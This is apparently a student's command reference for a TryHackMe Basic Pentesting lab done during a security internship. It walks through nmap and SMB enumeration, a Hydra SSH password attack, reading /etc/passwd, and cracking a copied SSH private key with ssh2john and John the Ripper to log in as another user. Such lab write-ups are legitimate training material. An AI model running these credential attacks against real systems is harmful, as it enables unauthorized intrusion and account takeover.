# 🛠️ VAPT Command Reference — ShadowFox Cyber Security Internship

This document contains the commands executed during the **ShadowFox Cyber Security Internship** while performing the **TryHackMe Basic Pentesting** assessment. Each command is documented with its objective, syntax, explanation, and expected outcome.

> **Environment:** Kali Linux + TryHackMe Basic Pentesting Lab

---

# Table of Contents

1. Environment Setup
2. Network Reconnaissance
3. Web Enumeration
4. SMB Enumeration
5. SSH Credential Attack
6. Linux Enumeration
7. SSH Key Analysis
8. Password Cracking
9. Privilege Escalation
10. Useful Linux Enumeration Commands

---

# 1. Environment Setup

## Connect to the TryHackMe VPN

### Objective

Establish a secure VPN connection between Kali Linux and the TryHackMe lab network.

### Command

```bash
sudo openvpn ~/Downloads/tryhackme.ovpn
```

### Explanation

* `sudo` — Runs OpenVPN with administrative privileges.
* `openvpn` — Starts the VPN client.
* `tryhackme.ovpn` — VPN configuration downloaded from TryHackMe.

### Expected Outcome

* VPN tunnel established.
* `Initialization Sequence Completed` message displayed.
* `tun0` network interface created.

---

## Verify VPN Interface

### Command

```bash
ip a
```

### Purpose

Displays all network interfaces and confirms that the `tun0` interface is active.

### Expected Outcome

A new VPN interface named `tun0` appears with an assigned IP address.

---

## Verify Target Connectivity

### Command

```bash
ping <TARGET_IP>
```

### Purpose

Checks whether the target machine is reachable through the VPN tunnel.

### Expected Outcome

Successful ICMP replies confirm network connectivity.

---

# 2. Network Reconnaissance

## Aggressive Nmap Scan

### Objective

Identify open ports, services, versions, operating system information, and potential attack vectors.

### Command

```bash
nmap -sV -A <TARGET_IP>
```

### Parameter Breakdown

| Flag  | Description                                                          |
| ----- | -------------------------------------------------------------------- |
| `-sV` | Detect service versions.                                             |
| `-A`  | Enable OS detection, version detection, NSE scripts, and traceroute. |

### Outcome

Discovered exposed services including SSH, HTTP, NetBIOS, and SMB.

---

## Full TCP Port Scan (Optional Enumeration)

### Command

```bash
nmap -p- <TARGET_IP>
```

### Purpose

Scans all **65,535 TCP ports** instead of the default top ports.

### Expected Outcome

Identifies any additional exposed ports not included in the default scan.

---

## Default Scripts + Version Detection

### Command

```bash
nmap -sC -sV -p- <TARGET_IP>
```

### Purpose

Performs default Nmap NSE scripts and detects service versions.

### Expected Outcome

Additional service information and script output.

---

# 3. Web Enumeration

## HTTP Enumeration

### Objective

Discover hidden directories and common web resources.

### Command

```bash
sudo nmap -p80 --script http-enum <TARGET_IP>
```

### Purpose

Uses the Nmap HTTP Enumeration script to identify interesting directories and files.

### Outcome

Hidden `/development` directory discovered.

---

## Access Hidden Directory

### URL

```text
http://<TARGET_IP>/development
```

### Purpose

Inspect publicly accessible development files.

### Files Observed

* `dev.txt`
* `j.txt`

### Security Observation

Developer notes exposed internal information.

---

# 4. SMB Enumeration

## SMB Enumeration with Enum4Linux

### Objective

Gather information from the SMB service.

### Command

```bash
enum4linux -a <TARGET_IP>
```

### Purpose

Collects:

* User accounts
* SMB shares
* NetBIOS information
* Operating system details

### Outcome

Anonymous SMB share and valid usernames identified.

---

## List SMB Shares

### Command

```bash
smbclient -L //<TARGET_IP>/ -N
```

### Parameter Breakdown

| Flag | Description                            |
| ---- | -------------------------------------- |
| `-L` | List available SMB shares.             |
| `-N` | Attempt anonymous login (no password). |

### Outcome

Available SMB shares displayed.

---

## Access Anonymous SMB Share

### Command

```bash
smbclient //<TARGET_IP>/Anonymous
```

### Purpose

Connect to the anonymous SMB share.

### Useful SMBClient Commands

```bash
dir
```

Lists files.

```bash
get staff.txt
```

Downloads the file locally.

```bash
exit
```

Closes the SMB session.

### Outcome

Retrieved `staff.txt` containing user information.

---

# 5. SSH Credential Attack

## Hydra Dictionary Attack

### Objective

Perform an authorized SSH dictionary attack.

### Command

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -I
```

### Parameter Breakdown

| Flag     | Description          |
| -------- | -------------------- |
| `-l`     | Username.            |
| `-P`     | Password wordlist.   |
| `ssh://` | Target SSH service.  |
| `-I`     | Ignore restore file. |

### Outcome

Hydra tested passwords from the RockYou dictionary and discovered valid SSH credentials.

---

## Resume Previous Hydra Session (Optional)

```bash
hydra -R
```

Resumes an interrupted Hydra attack.

---

# 6. SSH Access & Linux Enumeration

## SSH Login

### Objective

Authenticate using discovered credentials.

### Command

```bash
ssh jan@<TARGET_IP>
```

### Purpose

Establishes an SSH session with the target machine.

### Outcome

Authenticated shell access obtained.

---

## View Linux Users

### Command

```bash
cat /etc/passwd
```

### Purpose

Lists user accounts and home directories.

### Security Use

Useful during privilege escalation enumeration.

---

## Navigate to Home Directory

```bash
cd /home
```

Lists user directories.

```bash
ls
```

Shows available users.

---

## Inspect User Directory

```bash
cd /home/kay
ls -la
```

### Purpose

Identify hidden files and permissions.

### Outcome

Sensitive files and SSH directory identified.

---

## Read Protected File

```bash
cat pass.bak
```

### Observation

Permission denied when executed as another user.

---

# 7. SSH Key Analysis

## Locate SSH Key Cracking Script

### Command

```bash
locate ssh2john.py
```

### Purpose

Finds the location of the conversion script on Kali Linux.

---

## Restrict Local Private Key Permissions

### Command

```bash
chmod 400 bp
```

### Purpose

Makes the copied SSH private key readable only by the owner.

---

## Convert SSH Private Key to Hash

### Command

```bash
python3 /usr/share/john/ssh2john.py bp > hash.txt
```

### Purpose

Converts encrypted SSH private key into John-the-Ripper-compatible hash format.

### Output

`hash.txt`

Contains the converted hash.

---

## View Generated Hash

```bash
cat hash.txt
```

### Purpose

Verify successful conversion.

---

# 8. Password Cracking

## John the Ripper Dictionary Attack

### Objective

Recover the SSH private key passphrase.

### Command

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Parameter Breakdown

| Flag         | Description                   |
| ------------ | ----------------------------- |
| `--wordlist` | Dictionary used for cracking. |
| `hash.txt`   | Converted SSH key hash.       |

### Outcome

Passphrase successfully recovered.

---

## Display Cracked Password

```bash
john --show hash.txt
```

### Purpose

Displays recovered credentials from John's database.

---

# 9. Privilege Escalation

## Authenticate Using SSH Private Key

### Objective

Log into the target using the recovered SSH private key.

### Command

```bash
ssh -i bp kay@<TARGET_IP>
```

### Parameter Breakdown

| Flag | Description                  |
| ---- | ---------------------------- |
| `-i` | Identity file (private key). |

### Outcome

Authenticated as the second user.

---

## Verify User

```bash
whoami
```

### Purpose

Displays the currently authenticated user.

---

## Access Protected Backup File

```bash
cat pass.bak
```

### Outcome

Previously restricted file became accessible after privilege escalation.

---

# 10. Useful Linux Enumeration Commands

These commands were useful during manual enumeration.

## Current Directory

```bash
pwd
```

Displays current working directory.

---

## List Files

```bash
ls
```

Lists visible files.

```bash
ls -la
```

Lists all files including hidden files and permissions.

---

## File Permissions

```bash
stat <filename>
```

Displays detailed file metadata.

---

## Current User

```bash
whoami
```

Shows authenticated username.

---

## User Identity

```bash
id
```

Displays UID, GID, and group memberships.

---

## Check Hidden Files

```bash
ls -la ~/.ssh
```

Lists SSH authentication files.

---

## Read File Contents

```bash
cat <filename>
```

Prints file contents to the terminal.

---

# 📋 Summary of Commands Used During the Assessment

| Phase                  | Primary Command           |
| ---------------------- | ------------------------- |
| VPN Connection         | `sudo openvpn`            |
| Connectivity Check     | `ip a`, `ping`            |
| Network Enumeration    | `nmap -sV -A`             |
| HTTP Enumeration       | `nmap --script http-enum` |
| SMB Enumeration        | `enum4linux -a`           |
| SMB Access             | `smbclient`               |
| Password Attack        | `hydra`                   |
| SSH Login              | `ssh`                     |
| User Enumeration       | `cat /etc/passwd`         |
| Permission Enumeration | `ls -la`                  |
| SSH Key Conversion     | `ssh2john.py`             |
| Password Cracking      | `john --wordlist`         |
| Privilege Escalation   | `ssh -i`                  |

---

## ⚠️ Ethical Disclaimer

All commands documented in this repository were executed **only within the TryHackMe Basic Pentesting training environment** as part of the **ShadowFox Cyber Security Internship**. They are included for educational documentation and authorized penetration testing practice only.
